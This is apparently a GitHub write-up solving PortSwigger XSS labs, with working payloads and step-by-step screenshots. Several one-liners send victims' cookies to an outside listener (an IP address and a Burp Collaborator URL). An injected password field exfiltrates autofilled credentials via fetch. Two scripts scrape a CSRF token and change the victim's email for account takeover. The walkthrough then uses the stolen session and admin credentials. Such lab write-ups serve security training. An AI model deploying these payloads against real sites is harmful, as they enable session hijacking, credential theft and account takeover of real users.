### Exploiting cross-site scripting vulnerabilities

To demonstrate XSS vulnerability, a common method is to create a popup using the `alert()` function. This isn't because XSS is related to popups; it's a way to show that you can run arbitrary JavaScript on a specific domain. Some may use `alert(document.domain)` to clarify the executing domain.

Sometimes, it's necessary to go beyond proof and provide a complete exploit to illustrate the severity of an XSS vulnerability. In this section, we'll delve into three widely used and potent methods to exploit an XSS vulnerability.

### Exploiting cross-site scripting to steal cookies

Exploiting XSS to steal cookies is a traditional method. Since many web apps use cookies for session management, an attacker can use XSS to send the victim's cookies to their domain and impersonate the victim by injecting these cookies into the browser.

However, this approach has limitations:

- The victim may not be logged in.
- Some apps protect cookies using the `HttpOnly` flag, making them inaccessible to JavaScript.
- Additional security measures, like locking sessions to the user's IP address, can thwart attacks.
- The session may expire before the attacker can hijack it.

## Steal Cookies Scripts

1. One-Liner
   
   ```html
   <script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>
   ```

2. `<img>` Tag Instead of `<script>` Tags
   
   ```js
   <img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>
   ```

3. `<img>` Tag and Without the Infinite Loop
   
   ```html
   <img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
   ```

4. Using fetch
   
   ```html
   <script>
   fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
   method: 'POST',
   mode: 'no-cors',
   body:document.cookie
   });
   </script>
   ```

#### EX: Exploiting cross-site scripting to steal cookies

First, test with this `<img src="1" onerror="alert()">` to know where the payload stored or if there are any changes on it

![Screenshot from 2023-09-20 05-31-56](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/2708edd9-bf68-4ff7-b914-f85f66388646)
And It's work then let's try to steal any cookie with this vulnerability in this lab we will use burp collaborator

![Screenshot from 2023-09-20 05-32-06](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/fa21d0e5-841f-43b9-9e61-a76647c58936)
And past the burp collaborator url in this script

```js
<img src=x onerror=this.src='http://burp-collaborator-url/?'+document.cookie;>
```

![Screenshot from 2023-09-20 05-42-00](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/4be6ef6d-3eca-414a-b914-d7616539ed2b)
And post it 

![Screenshot from 2023-09-20 05-42-40](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/6a713b19-f1e2-49c6-8bd0-8e983472029a)
we got an session cookie of somone then let's copy it

![Screenshot from 2023-09-20 05-44-07](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/df63f3e9-4bdd-493c-bcc6-85f2aa1ba32b)
Capture any page request and change his session with session that we stealed it 

![Screenshot from 2023-09-20 05-46-58](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/97aa6ebc-9314-4b78-8241-8e564441b5b5)
Intercept off

![Screenshot from 2023-09-20 05-47-17](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/c997b61e-a3dc-468a-a62e-4c3e517790ba)
And lab solved

![Screenshot from 2023-09-20 05-47-26](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/a886cd1d-4d50-4baa-a039-4a4bfb632821)
we can access admin panel with this cookie

![Screenshot from 2023-09-20 05-49-43](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/1e0c3dfb-bd92-423f-92cb-0cbf85455383)

> [**Python Script for this lab**](https://github.com/MohammedHawary/Solve-Portswigger-Labs-With_py/blob/main/XSS/Exploiting_cross_site_scripting_to_steal_cookies.py)

### Exploiting cross-site scripting to capture passwords

Today, with password managers auto-filling, you can create a password input, extract the auto-filled password, and send it to your domain. This method mitigates cookie theft issues and can access other accounts with reused passwords.

The main drawback is that it relies on users having a password manager with auto-fill. If a user doesn't have a saved password, you could resort to on-site phishing, but it's not as effective.

#### EX: Exploiting cross-site scripting to capture passwords

First, test with this `<img src="1" onerror="alert()">` to know where the payload stored or if there are any changes on it

![Screenshot from 20230920 053156](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/2708edd9-bf68-4ff7-b914-f85f66388646) And It's work then let's try to steal any cookie with this vulnerability in this lab we will use burp collaborator

![Screenshot from 20230920 053206](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/fa21d0e5-841f-43b9-9e61-a76647c58936) And past the burp collaborator url in this script

```html
<input type=text name=username id="username" placeholder="user name">
<input type=password name=password placeholder="password" onchange="if(this.value.length)fetch('https:/burp-collaborator-url',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value}
);">
```

![Screenshot from 2023-09-20 09-37-41](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/989c214e-a305-4bdb-9adc-36526197a883)

And post it

![Screenshot from 2023-09-20 07-18-46](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/81b27e01-afca-4701-82a1-1cc4efcec0e5)
we got an username and passworf of admin then let's login with it

![Screenshot from 2023-09-20 07-19-52](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/999d5de1-94be-4c5a-a4ca-fc93ded2872c)
Done

![Screenshot from 2023-09-20 07-20-46](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/bc34a9c7-e1e6-4856-a1f6-a7259a9d2cfd)

> [**Python Script for this lab**](https://github.com/MohammedHawary/Solve-Portswigger-Labs-With_py/blob/main/XSS/Exploiting_cross_site_scripting_to_capture_passwords.py)

### Exploiting cross-site scripting to perform CSRF

Anything a legitimate user can do on a web site, you can probably do too with XSS. Depending on the site you're targeting, you might be able to make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin. 

With XSS, you can exploit sites that let users change email addresses without password confirmation. Exploiting this, you can alter the victim's email to yours and then initiate a password reset, gaining access to the account.

This exploit is often called CSRF, though it can exist independently. Standalone CSRF can be mitigated with anti-CSRF tokens, but these won't safeguard against XSS vulnerabilities simultaneously.

#### EX: Exploiting XSS to perform CSRF

After login there are page and in this page you can change your emal wihtout password

then let's change our email and capture this request

![Screenshot from 2023-08-14 11-35-17](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/a1e0d142-9da1-41c9-a6ed-d33a1c209b87)

create csrf payload with burp

![Screenshot from 2023-09-20 09-53-45](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/1c97cd63-d5db-43a7-b368-2a012ca0cc3f)
and test it in browser to see if this page vuln with csrf

![Screenshot from 2023-09-20 09-54-06](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/5cd8ef95-3012-417d-beee-e93d00af23ff)
Our emal changed then it's vuln with csrf but there are a csrf tooken then we need xss to perform this vulnerability

![Screenshot from 2023-09-20 09-54-19](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/fa5c8835-346c-4208-9e5a-3287dbbf3c44)

and there are another page vuln with xss

![Screenshot from 2023-09-20 09-57-13](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/7e52246b-ccca-4c53-b23d-c8fdf0ecc9be)
![Screenshot from 2023-09-20 09-57-27](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/b9923e87-0ab1-45c6-9247-5e5b694e74c2)

Then lets create payload with this into we can create two palyoads:

First payload:

```html
<script>
fetch('/my-account')
  .then(r => r.text())
  .then(t => t.match(/name="csrf" value="(\w+)"/))
  .then(m => m && fetch('/my-account/change-email', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `csrf=${m[1]}&email=test@test.com` }))
  .then(r => r.ok ? console.log('Email changed successfully.') : console.error('Email change failed with status ' + r.status))
  .catch(e => console.error('Error:', e));
</script>
```

Second payload:

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

![Screenshot from 2023-09-20 11-35-59](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/236a06ce-7095-4b6e-9538-8a87cdb052db)![Screenshot from 2023-09-20 11-18-43](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/ef43fa16-6cbf-4d55-89ef-84e747cd30f3)
It's work

![Screenshot from 2023-09-20 11-18-51](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/f884f9ee-21eb-4067-91ac-c703023ef1b5)

> [**Python Script for this lab**](https://github.com/MohammedHawary/Solve-Portswigger-Labs-With_py/blob/main/XSS/Exploiting_XSS_to_perform_CSRF.py)


